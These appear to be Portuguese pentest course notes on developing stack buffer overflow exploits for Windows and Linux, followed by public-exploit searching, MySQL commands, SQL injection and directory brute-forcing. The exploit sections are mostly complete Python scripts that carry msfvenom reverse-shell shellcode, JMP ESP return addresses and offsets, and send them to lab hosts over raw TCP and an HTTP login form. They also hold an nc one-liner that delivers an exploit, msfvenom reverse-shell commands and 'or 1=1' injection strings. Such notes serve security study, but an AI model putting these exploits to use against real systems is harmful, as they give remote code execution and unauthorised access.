Com esse código acima você descobre até onde a aplicação quebra, depois é descoberto o número exato que ela de fato quebra... como é feito testando com o código abaixo.

#/usr/bin/python

import socket

dados = "A" * 2000 + "B" * 100 + "C" 100

s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.254.207", 1020))

banner = s.recv(1024)

s.send("SEND "+dados"\r\n")

A aplicação quebra em 2200, então a ideia é ir quebrando até chegar #no número exato que a aplicação quebra. 2200 é o número de bytes que a aplicação quebra como testado com o código acima.

    Locate pattern_create

        Localiza o pattern_create

    /usr/bin/msf-pattern_create -l 2200 

        Descobrir qual o padrão para pesquisar o offset no msf-pattern, deve ser usado com o código em python para enviar e monitorar com o Immunity o EIP

    /usr/bin/msf-pattern_offset -l 2200 -q ED3R3EIP 

        Com os dados em EIP informar na query e saber o offset para criar o exploit do buffer overflow


Nota: Para saber se tem espaço para o shellcode é necessário enviar mais letras após o tamanho dos bits encontrado no EIP para saber se cabe pelo menos 300 caracteres que seria o equivalente ao tamanho do shellcode

    Gerando badchars com Python

for num in range(1, 256):

    print hex(num).replace('0x','\\x'),

"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


De uma forma automatizada para criar badchars é usando o !MONA bytearray No Immunity debugger 

Para fazer o teste dos badchars é necessário mandar os caracteres gerados e dar um following dump para saber se tem algum char faltando e eliminar do shellcode, geralmente o \x00 \x0a \x0d

Pesquisando JUMP ESP

Com 2007 bytes e 4 bytes em EIP eu quebro a aplicação

E EIP apontando para ESP eu consigo colocar uma shell e ganhar acesso, mas para encontrar o endereço de retorno é necessário encontrar um endereço que faça um JMP ESP pois ESP sempre muda de endereço...COMO? Procura as dlls carregadas em E com direito na dll (preferência do programa) -> view code CPU -> search-for-command JMP ESP e copia o endereço para usar no Ponteiro. ALTERNATIVA !mona modules Verifica as que tem ASL (proteção) inativa ou !mona find -s "\xff\xe4" -m netserver.dll (dll que tem ASL em false) com o endereço, copia ele e clica na setinha azul do Immunity e vai para o endereço seta um breakpoint, prepara o codigo ex.: 0x625012a0 -> "\xa0\x12\x50\x62" Adiciona os NOPs "\x90" * 32

Gerando o shellcode

    msfvenom -p windows/shell_reverse_tcp lhost=192.168.2.10 lport=443 exitfunc-thread -b "\x00" -f c

        Comando para gerar o shellcode já excluindo os badchars (basta colocar o código e refazer o envio já inserindo o shellcode) Depois é só rodar o exploit e pronto.


    Exploit criado para netserver

#!/usr/bin/python

import socket

#send = "A" * 1500 + "B" * 1500

#send = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"

#send = "A" * 2007 + "BBBB" 0x625012a0

#badchar \x00

#send = "A" * 2007 + "\xa0\x12\x50\x62" + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

shell = ("\xd9\xca\xb8\x8e\x06\xc1\xab\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"

"\x52\x83\xc7\x04\x31\x47\x13\x03\xc9\x15\x23\x5e\x29\xf1\x21"

"\xa1\xd1\x02\x46\x2b\x34\x33\x46\x4f\x3d\x64\x76\x1b\x13\x89"

"\xfd\x49\x87\x1a\x73\x46\xa8\xab\x3e\xb0\x87\x2c\x12\x80\x86"

"\xae\x69\xd5\x68\x8e\xa1\x28\x69\xd7\xdc\xc1\x3b\x80\xab\x74"

"\xab\xa5\xe6\x44\x40\xf5\xe7\xcc\xb5\x4e\x09\xfc\x68\xc4\x50"

"\xde\x8b\x09\xe9\x57\x93\x4e\xd4\x2e\x28\xa4\xa2\xb0\xf8\xf4"

"\x4b\x1e\xc5\x38\xbe\x5e\x02\xfe\x21\x15\x7a\xfc\xdc\x2e\xb9"

"\x7e\x3b\xba\x59\xd8\xc8\x1c\x85\xd8\x1d\xfa\x4e\xd6\xea\x88"

"\x08\xfb\xed\x5d\x23\x07\x65\x60\xe3\x81\x3d\x47\x27\xc9\xe6"

"\xe6\x7e\xb7\x49\x16\x60\x18\x35\xb2\xeb\xb5\x22\xcf\xb6\xd1"

"\x87\xe2\x48\x22\x80\x75\x3b\x10\x0f\x2e\xd3\x18\xd8\xe8\x24"

"\x5e\xf3\x4d\xba\xa1\xfc\xad\x93\x65\xa8\xfd\x8b\x4c\xd1\x95"

"\x4b\x70\x04\x39\x1b\xde\xf7\xfa\xcb\x9e\xa7\x92\x01\x11\x97"

"\x83\x2a\xfb\xb0\x2e\xd1\x6c\x7f\x06\xdb\x07\x17\x55\xdb\xd6"

"\x5c\xd0\x3d\xb2\xb2\xb5\x96\x2b\x2a\x9c\x6c\xcd\xb3\x0a\x09"

"\xcd\x38\xb9\xee\x80\xc8\xb4\xfc\x75\x39\x83\x5e\xd3\x46\x39"

"\xf6\xbf\xd5\xa6\x06\xc9\xc5\x70\x51\x9e\x38\x89\x37\x32\x62"

"\x23\x25\xcf\xf2\x0c\xed\x14\xc7\x93\xec\xd9\x73\xb0\xfe\x27"

"\x7b\xfc\xaa\xf7\x2a\xaa\x04\xbe\x84\x1c\xfe\x68\x7a\xf7\x96"

"\xed\xb0\xc8\xe0\xf1\x9c\xbe\x0c\x43\x49\x87\x33\x6c\x1d\x0f"

"\x4c\x90\xbd\xf0\x87\x10\xdd\x12\x0d\x6d\x76\x8b\xc4\xcc\x1b"

"\x2c\x33\x12\x22\xaf\xb1\xeb\xd1\xaf\xb0\xee\x9e\x77\x29\x83"

"\x8f\x1d\x4d\x30\xaf\x37")

send = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + shell

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.2.106", 5800))

s.recv(1024)

#print banner

s.send("SEND "+send+"\r\n")

#r = s.recv(1024)

#print r


    DESENVOLVIMENTO DE EXPLOITS WINDOWS 10

 

    !mona findmsp 

        Encontra o número do OffSet para chegar ao EIP e adiciona +4


    Exploit Montado no módulo de dev exploit Win10

#/usr/bin/python/

import socket

# /usr/bin/msf-pattern_offset -l 1000 -q 42306142

# Exact match at offset 780

# bad chars:  \x00\x0a\x0d\x25\x26\x2b\x3d

# #dados="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af>

# 0x10090c83

# windows/shell_reverse_tcp -b "bad_chars" -f c

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.106 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c


shell = ("\xb8\xd6\x7e\xbf\x1b\xd9\xcf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"

"\x52\x83\xc2\x04\x31\x42\x0e\x03\x94\x70\x5d\xee\xe4\x65\x23"

"\x11\x14\x76\x44\x9b\xf1\x47\x44\xff\x72\xf7\x74\x8b\xd6\xf4"

"\xff\xd9\xc2\x8f\x72\xf6\xe5\x38\x38\x20\xc8\xb9\x11\x10\x4b"

"\x3a\x68\x45\xab\x03\xa3\x98\xaa\x44\xde\x51\xfe\x1d\x94\xc4"

"\xee\x2a\xe0\xd4\x85\x61\xe4\x5c\x7a\x31\x07\x4c\x2d\x49\x5e"

"\x4e\xcc\x9e\xea\xc7\xd6\xc3\xd7\x9e\x6d\x37\xa3\x20\xa7\x09"

"\x4c\x8e\x86\xa5\xbf\xce\xcf\x02\x20\xa5\x39\x71\xdd\xbe\xfe"

"\x0b\x39\x4a\xe4\xac\xca\xec\xc0\x4d\x1e\x6a\x83\x42\xeb\xf8"

"\xcb\x46\xea\x2d\x60\x72\x67\xd0\xa6\xf2\x33\xf7\x62\x5e\xe7"

"\x96\x33\x3a\x46\xa6\x23\xe5\x37\x02\x28\x08\x23\x3f\x73\x45"

"\x80\x72\x8b\x95\x8e\x05\xf8\xa7\x11\xbe\x96\x8b\xda\x18\x61"

"\xeb\xf0\xdd\xfd\x12\xfb\x1d\xd4\xd0\xaf\x4d\x4e\xf0\xcf\x05"

"\x8e\xfd\x05\x89\xde\x51\xf6\x6a\x8e\x11\xa6\x02\xc4\x9d\x99"

"\x33\xe7\x77\xb2\xde\x12\x10\x7d\xb6\x1e\x8a\x15\xc5\x1e\x4b"

"\x5d\x40\xf8\x21\xb1\x05\x53\xde\x28\x0c\x2f\x7f\xb4\x9a\x4a"

"\xbf\x3e\x29\xab\x0e\xb7\x44\xbf\xe7\x37\x13\x9d\xae\x48\x89"

"\x89\x2d\xda\x56\x49\x3b\xc7\xc0\x1e\x6c\x39\x19\xca\x80\x60"

"\xb3\xe8\x58\xf4\xfc\xa8\x86\xc5\x03\x31\x4a\x71\x20\x21\x92"

"\x7a\x6c\x15\x4a\x2d\x3a\xc3\x2c\x87\x8c\xbd\xe6\x74\x47\x29"

"\x7e\xb7\x58\x2f\x7f\x92\x2e\xcf\xce\x4b\x77\xf0\xff\x1b\x7f"

"\x89\x1d\xbc\x80\x40\xa6\xdc\x62\x40\xd3\x74\x3b\x01\x5e\x19"

"\xbc\xfc\x9d\x24\x3f\xf4\x5d\xd3\x5f\x7d\x5b\x9f\xe7\x6e\x11"

"\xb0\x8d\x90\x86\xb1\x87")


#dados = "A" * 780 + "\x83\x0c\x09\x10"     + "C" * (1000 - 780)

dados = "A" * 780 + "\x83\x0c\x09\x10"     + "\x90" * 16 + shell

tam = len(dados) + 20

request="POST /login HTTP/1.1\r\n"

request+="Host: 192.168.254.54\r\n"

request+="Content-Length: "+str(tam)+"\r\n"

request+="Cache-Control: max-age=0\r\n"

request+="Upgrade-Insecure-Requests: 1\r\n"

request+="Origin: http://192.168.254.54\r\n"

request+="Content-Type: application/x-www-form-urlencoded\r\n"

request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\n"

request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"

request+="Referer: http://192.168.254.54/login\r\n"

request+="Accept-Encoding: gzip, deflate\r\n"

request+="Accept-Language: en-US,en;q=0.9\r\n"

request+="Connection: close\r\n"

request+="\r\n"

request+="username="+dados+"&password=A"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.2.106", 80))

s.send(request)

Nota: Resumindo-> Analisa a aplicação, comportamento, faz o primeiro teste que é saber até quantos chars a aplicação crasha, pode se usar o burp suite e testar e depois pegar o código HTML para inserir no script, depois pode se usar o comando do pattern-offset do msf para encontrar o endereço de EIP ou usar o comando !mona findmsp para encontrar o valor que aponta para EIP e usar a seta para poder encontrar o endereço no debugger e usar o f2 para inserir ele no breakpoint e depois encontrar o endereço que faz um JUMP ESP para colocar no EIP, assim apontando para EIP, após isso é necessário gerar códigos ASCII para inserir no programa e identificar os badchars e excluir na hora de gerar o shellcode com o msfvenom e depois inserir o shellcode no script. Com o Immunity debugger deve sempre atentar para restartar o serviço colocar no immunity clicar no botão play, setar um breakpoint para verificar se está correto a inserção do shellcode, lembrar de colocar para escutar na porta informada.

    MECANISMOS DE PROTEÇÃO


DEP - Data prevention execution 

Por padrão não vem habilitado para todos os programas, caso necessário, ativar o DEP para todos os programas /NXCOMPACT [:NO] para fazer programa seguro

ASLR - Deixar os endereços de memórias aleatórios - Evitando encontrar um endereço fixo. Pode habilitar a função no windows ou adicionar o /DINAMICBASE [:NO] no Código do arquivo.

    BUFFER OVERFLOW - LINUX


Comandos do debugger está no módulo acima, em: Comandos do GDB e GDB tui para Debugger linux 

Passa à passo para chegar no exploit final…

    b* 0xendereco 

        Com programa utilizado na aula dá um breakpoint do verifica no parâmetro gets

    run < <(python2 -c 'print "A" * 200') 

        Roda o comando com buffer de 200chars

    i r 

        Olha os registradores

    x/16xw $esp 

        Dá um follow nos chars do ESP

    x/16xw $ebp 

        Dá um follow nos chars do EBP

    c 

        Continua com o breakpoint

    i r 

        Olha os registradores


Analisa o LEA que reserva espaço na memória 0x88 = 136

    run < <(python2 -c 'print "A" * 136') 

        Roda o comando com buffer de 136chars

    x/16xw $esp  

        Dá um follow nos chars do ESP

    x/16xw $ebp 

        Dá um follow nos chars do EBP

    run < <(python2 -c 'print "A" * 136 + "BBBB"') 

        Roda o comando com buffer com buffer EIP

    x/16xw $esp 

        Dá um follow nos chars do ESP

    x/16xw $ebp 

        Dá um follow nos chars do EBP

    run < <(python2 -c 'print "A" * 136 + "BBBB" + "CCCC"') 

        Roda o comando com buffer com buffer EIP + validação

    x/16xw $esp 

        Dá um follow nos chars do ESP

    x/16xw $ebp 

        Dá um follow nos chars do EBP

    c  

        Continua com o breakpoint

    i r 

        Olha os registradores


Pega o endereço de acessar 0x56556270

    run < <(python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"')

        Roda e insere com os chars específicos para o buffer

    i r 

        Olha os registradores

    x/16xw $esp  

        Dá um follow nos chars do ESP

    c 

        Continua com o breakpoint


Dicas Debugger

    b*  main 

        Seta breakpoint em main

    disas verifica 

        Abre os endereços e códigos da parte verifica

    set $eip  = 0x56556270 ou $eip 

        Seta o endereço em EIP

    d 

        Deleta os breakpoints

    disas verifica 

        Abre os endereços e códigos da parte verifica

    b* 0x5655626e 

        Seta breakpoint no endereço informado

    x/20s $eip 

        Dá um dump nas infos gravadas no EIP


Exploração de binário (desafio)

    nc 172.30.0.10 8888 

        Sistema vulnerável para ganhar acesso com buffer overflow (./desafio)

    info functions 

        Dá uma olhada nas funções do sistema

    disas main  

        Abre os endereços e códigos da parte Main

    run < <(python2 -c 'print "A" * 150') 

        Roda o comando com buffer de 150chars

    b *  0x0804855b 

        Seta breakpoint no endereço informado

    c 

        Continua com o programa rodando depois do breakpoint

    x/20xw $esp 

        Dá um dump nas infos gravadas no ESP

    i r 

        Olha os registradores


Usar o patternCreate

    run < <(python2 -c 'print "A" * 136 + "BBBB"') 

        Roda o comando com buffer de 136 chars + EIP

    c 

        Continua com o programa rodando depois do breakpoint


Add o endereço da função do exploit 0x080484c0 no exploit

    run < <(python2 -c 'print "A" * 136 + "\x0c\x84\x04\x08" ') 

        Roda o comando com buffer de 136chars + EIP e o endereço de exploração que chama o exploit descoberto acima

    c 

        Continua com o programa rodando depois do breakpoint

    python2 -c 'print "A" * 136 + "\x0c\x84\x04\x08" ' | nc 172.30.0.10 8888  

        Exploit já criado pronto para ser executado no servidor que se encontra o programa.



    TRABALHANDO COM EXPLOITS PÚBLICOS


    Base de dados de exploits

        Exploit-db.com

        Packerstormsecurity.com

        Securityfocus.com

        Cve.mitre.org


    site:exploit-db.com "ipfire" 

        Pesquisa no google por vulnerabilidade no site passado

    searchsploit -u 

        Update a database de exploits (Tem a base de dados do exploit-db)

    searchsploit webmin 

        Procura pelo exploit do serviço informado

    searchsploit webmin --exclude="phpMy|Dans" 

        Filtros de exploits quando vem algo indesejado

    searchsploit -e smb 

        Procura exatamente pelo termo informado

    searchsploit --id -m 41149 

        Copia o exploit para o diretório atual (para exibir o ID é só passar o --id)


Usando o exploit em C para vulnerabilidade do syncbreeze

mingw Instalar software compilador do exploit para windows, o gcc não compila devido as libraries

    i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32 

        Compila o código executável (exploit)



    PENTEST WEB - WEB HACKING


Ferramentas: Gobuster, burp suite

    http://burp Para baixar o certificado e configurar no navegador.

    FoxProxy Plugin para ativar e desativar o proxy sem precisar ficar configurando

    CookieManager Manipular cookies e fazer testes


Nota: Php não mostra o código fonte próprio, mas o HTML e JS sim.

Comandos MySQL

Todos os comandos são intuitivos, não precisa de descrição...

    sudo service start mysql

    sudo mysql

    show databases;

    select database();

    select user();

    select version();

    create database DESEC;

    use desec;

    show tables;

    create table usuarios

        (id int primary key auto_increment,

        login varchar(20) not null,

        senha varchar(20) not null);

    describe usuarios;

    select id from usuarios;

    insert into usuarios values ('1','admin','admin');

    insert into users (id, login, pass) values ('1','admin','admin');

    select * from usuarios;

    selec login from usuarios;

    select * usuarios where senha="admin"

    select * usuarios order by login;

    delete from usuarios where id="7";


    use mysql;

    show tables;

    describe user;

    select host, user, password from user;

    create user ygor identified by 'senha123';

    GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;

    GRANT ALL PRIVILEGES ON database_name. * TO 'username'@'localhost' identified by 'p4$$';

    alter user 'root'@'localhost' identified with mysql_native_password by 'root';

    use informatio_schema;

    show tables;

    select * schemata; Traz todas as bases de dados

    describe tables;

    select table_schema, table_name from tables; 

        Traz todas as tabelas de todos os bancos

    select table_name from tables where table_schema="desec"; 

        Mostra diretamente as tabelas da base desec

    describe columns;

    select column_name from columns where table_schema="desec"; 

        Faz um filtro para mostrar a tabela usuarios da base desec

    use desec;

    select login,senha from usuarios;

    select concat(login, ':' ,senha) from usuarios 

        Coloca uma concatenação no que o comando traz deixando mais simples

    select @@version

    select 45+54

    select load_file('/var/www/html/index.html'); 

        Carrega arquivo dentro do sgdb

    select sleep(10); 

        Aguarda em segundos a resposta do banco

    select char(55); 

        Taz um caractere correspondente

    select length("desec");

    select substring("desec",1,3); 

        Traz as 3 primeiras letras da palavra

    drop database teste;

    source \home\user\Desktop\test.sql;


Sql Injection

select * from user where login='user' and senha='1234';

select * from user where login='hacker' or 1=1;# senha='1234';

select * from user where login='user' or 1=1;#

select * from user where login='user' or true limit 1;#

select * from user where login='user' and login='user' limit 1;#

    gobuster dir -u -e http://172.16.1.10 -u /wordlist.txt -s "200,301,302,401" -a user-agent

        Bruteforce de diretórios filtrando cod http e user agent

    gobuster dir -u -e http://172.16.1.10 -u /wordlist.txt -s "200,301,302,401" -x .php,.txt,.sql,.bkp

        Bruteforce de diretórios filtrando cod http e extensão de arquivos.

    curl -v -X OPTIONS http://172.16.1.10 

        Verifica todos os métodos do diretório, passar os outros dirs

